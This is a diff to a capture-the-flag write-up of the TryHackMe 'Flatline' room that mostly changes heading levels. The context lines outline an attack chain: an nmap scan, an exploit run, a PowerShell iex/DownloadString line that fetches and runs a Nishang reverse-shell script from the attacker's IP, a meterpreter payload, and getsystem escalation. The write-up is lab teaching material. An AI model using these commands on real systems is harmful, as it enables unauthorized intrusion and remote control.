@@ -13,13 +13,13 @@ img_path: /assets/img/tryhackme/flatline
 ---
 
 
-# **Description**
+## **Description**
 
 Hello hackers, I hope you are doing well. We are doing [Flatline](https://tryhackme.com/room/flatline) from [TryHackMe](https://tryhackme.com).
 
-# **Enumeration**
+## **Enumeration**
 
-## nmap
+### nmap
 
 We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 -Pn {target_IP}`.
 
@@ -77,7 +77,7 @@ Let's run the exploit
 
 I had to run the exploit multiple time before it gave me a result, not really sure why is that.
 
-# **Foothold**
+## **Foothold**
 
 Let's now get a reverse shell by using this [script](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1). Download it and serve it with an http server(python3 -m http.server).
 
@@ -92,7 +92,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://10.18.0.188/Inv
 ![](2.png)
 
 
-# **Privilege Escalation**
+## **Privilege Escalation**
 
 For this part, I decided to get a meterpreter shell. I generated a payload using the following command.
 
@@ -121,7 +121,3 @@ We can escalate our privileges to administrator by executing `getsystem`.
 ---
 
 Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
-
----
-
-# References
